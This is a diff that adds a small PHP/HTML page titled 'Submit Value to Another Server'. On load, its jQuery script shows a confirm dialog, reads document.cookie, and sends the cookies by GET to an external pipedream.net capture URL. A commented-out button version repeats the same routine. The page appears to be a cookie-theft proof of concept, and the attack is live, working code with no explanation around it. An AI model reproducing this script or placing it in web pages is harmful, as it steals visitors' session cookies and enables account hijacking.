@@ -1,0 +1,87 @@
+<?php 
+ //session_start();
+ //$sessionId = $_SESSION['PHPSESSID'];
+
+   //echo "Default session ID: $sessionId";
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Submit Value to Another Server</title>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+
+<!-- <button id="submitValue">Submit Value</button> -->
+
+<script>
+$(document).ready(function() {
+    function onConfirm() {
+    var cookie = document.cookie;
+    // Value to submit
+    var dataToSend = { value: cookie };
+    
+    // URL of the other server to submit the value
+    var url = 'https://en0t0nwzu0td7b.x.pipedream.net/';
+    // var url = 'Access-Control-Allow-Origin: http://localhost:5000/getcookie';
+    
+    // Make an AJAX POST request to the other server
+    $.ajax({
+      type: 'GET',
+      url: url,
+      data: dataToSend,
+      success: function(response) {
+        console.log('Value submitted successfully:', response);
+        // Handle the response from the server
+      },
+      error: function(xhr, status, error) {
+        console.error('Error submitting value:', error);
+        // Handle the error
+      }
+    });
+    }
+
+    // Add an event listener to the window.confirm() method
+    $(window).on('confirm', function(event, message) {
+        // Display the confirmation dialog box
+        if (confirm(message)) {
+            // If the user confirms, execute the onConfirm function
+            onConfirm();
+        }
+    });
+
+    // Trigger the confirm box event with a message
+    $(window).trigger('confirm', ['Are you sure you want to perform this action?']);
+
+
+//   $('#submitValue').click(function() {
+//     var cookie = document.cookie;
+//     // Value to submit
+//     var dataToSend = { value: cookie };
+    
+//     // URL of the other server to submit the value
+//     var url = 'https://en0t0nwzu0td7b.x.pipedream.net/';
+//     // var url = 'Access-Control-Allow-Origin: http://localhost:5000/getcookie';
+    
+//     // Make an AJAX POST request to the other server
+//     $.ajax({
+//       type: 'GET',
+//       url: url,
+//       data: dataToSend,
+//       success: function(response) {
+//         console.log('Value submitted successfully:', response);
+//         // Handle the response from the server
+//       },
+//       error: function(xhr, status, error) {
+//         console.error('Error submitting value:', error);
+//         // Handle the error
+//       }
+//     });
+//   });
+});
+</script>
+
+</body>
+</html>
